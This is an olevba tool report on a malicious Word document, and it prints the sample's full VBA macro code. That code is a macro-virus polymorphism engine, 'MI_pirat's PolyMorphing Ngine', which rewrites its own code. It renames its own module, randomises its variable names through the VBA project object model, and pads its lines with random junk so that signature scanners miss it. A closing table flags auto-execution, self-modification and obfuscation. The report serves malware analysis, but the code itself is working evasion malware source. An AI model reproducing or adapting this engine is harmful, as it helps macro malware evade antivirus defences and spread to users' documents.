olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.MPPN2-957c6110dd87fac47abd0f9d8ce854cbe73cd196
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.MPPN2-957c6110dd87fac47abd0f9d8ce854cbe73cd196 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO XXX.bas 
in file: VirTool.MSWord.MPPN2-957c6110dd87fac47abd0f9d8ce854cbe73cd196 - OLE stream: 'Macros/VBA/XXX'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub PolyNgine()
'Gen0
'MI_pirat's PolyMorphing Ngine
On Error Resume Next
If ThisDocument.Name <> NormalTemplate.Name Then
nr = 12
ReDim suk(1 To nr) As String
suk(1) = "nr": suk(2) = "bkup": suk(3) = "nuk"
suk(4) = "suk": suk(5) = "myRange": suk(6) = "strip": suk(7) = "ik"
suk(8) = "char1": suk(9) = "nur": suk(10) = "nam1": suk(11) = "nam2"
suk(12) = "kewl"
bkup = ActiveDocument.Content
'find and change the module name (100% poly)
For ik = 1 To ActiveDocument.VBProject.VBComponents.Count
nam1 = ActiveDocument.VBProject.VBComponents(ik).CodeModule.Lines(2, 1)
char1 = Mid(nam1, 1, 1)
nur = Len(nam1)
If nur >= 4 Then nam2 = Mid(nam1, 2, 3)
If (char1 = "'") And (nam2 = ActiveDocument.VBProject.VBComponents(ik).Name) Then
Randomize
nam2 = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65))
ActiveDocument.VBProject.VBComponents(ik).CodeModule.ReplaceLine 2, "'" + nam2
ActiveDocument.VBProject.VBComponents(ik).Name = nam2
kewl = ik
End If
Next ik
'copy this code to the doc
ActiveDocument.Windows(1).WindowState = wdWindowStateMinimize
ActiveDocument.Content = ""
nuk = ActiveDocument.VBProject.VBComponents(kewl).CodeModule.CountOfLines
'copy this source into the doc (so I can modify it)
For ik = 1 To nuk
ActiveDocument.Content = ActiveDocument.Content + ActiveDocument.VBProject.VBComponents(kewl).CodeModule.Lines(ik, 1)
Next ik
'now find the vars and poymorph 'em !
For ik = 1 To nr
Randomize
strip = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "M1"
Set myRange = ActiveDocument.Content
myRange.Find.Execute FindText:=suk(ik), ReplaceWith:=strip, Replace:=wdReplaceAll
Next ik
'copy everythig back to its origin
nuk = ActiveDocument.VBProject.VBComponents(kewl).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.DeleteLines 1, nuk
strip = ActiveDocument.Content
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.AddFromString strip
ActiveDocument.Content = ""
ActiveDocument.Content = bkup
mm:
If ActiveDocument.VBProject.VBComponents(kewl).CodeModule.Lines(1, 1) <> "Sub AutoOpen()" Then
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.DeleteLines 1, 1
GoTo mm
End If
'Add random chars
nr = ActiveDocument.VBProject.VBComponents.Item(kewl).CodeModule.CountOfLines
For ik = 2 To nr
nam1 = ActiveDocument.VBProject.VBComponents(kewl).CodeModule.Lines(ik, 1)
nam2 = Mid(nam1, Len(nam1))
If (nam2 <> "!") And (Len(nam1) < 80) Then
char1 = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
strip = nam1 + " '" + char1 + "!"
ActiveDocument.VBProject.VBComponents.Item(kewl).CodeModule.ReplaceLine ik, strip
End If
Next ik
ActiveDocument.VBProject.VBComponents(kewl).CodeModule.DeleteLines nr, 1
ActiveDocument.Windows(1).WindowState = wdWindowStateMaximize
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

